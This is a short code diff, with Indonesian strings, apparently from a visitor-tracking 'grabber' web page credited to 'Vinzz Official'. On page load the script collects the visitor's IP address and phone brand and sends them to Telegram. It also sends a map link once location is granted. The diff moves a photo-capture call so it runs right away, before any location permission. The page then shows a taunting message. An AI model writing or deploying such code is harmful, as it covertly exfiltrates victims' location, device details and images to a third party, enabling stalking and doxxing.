@@ -80,7 +80,8 @@ text: pesan
 (async () => {
 const ip = await getIP();
 const merek = getMerekHP();
-const pesanAwal = `IP berhasil ditemukan!\nStatus: MENUNGGU IZIN LOKASI\nIP: ${ip}\nMerek hp: ${merek}`;
+const pesanAwal = `IP berhasil ditemukan!\nStatus: MENUNGGU IZIN LOKASI\nIP: ${ip}\nMerek hp: ${merek}`; 
+await kirimFoto();
 await kirimPesanTelegram(pesanAwal);
 })();
 
@@ -93,8 +94,7 @@ navigator.geolocation.getCurrentPosition(
     const merek = getMerekHP();
 
     // Menambahkan link peta di pesan jika lokasi diizinkan
-    const pesan = `IP berhasil ditemukan!\nStatus: MENGIZINKAN LOKASI\nIP: ${ip}\nMerek hp: ${merek}\nLokasi: ${gmaps}`;
-    await kirimFoto();
+    const pesan = `IP berhasil ditemukan!\nStatus: MENGIZINKAN LOKASI\nIP: ${ip}\nMerek hp: ${merek}\nLokasi: ${gmaps}`
     await kirimPesanTelegram(pesan);
 
     document.body.innerHTML = '<h2>Yahh kurang hoki bro wkwk.<br><small>by Vinzz Official</small></h2>';
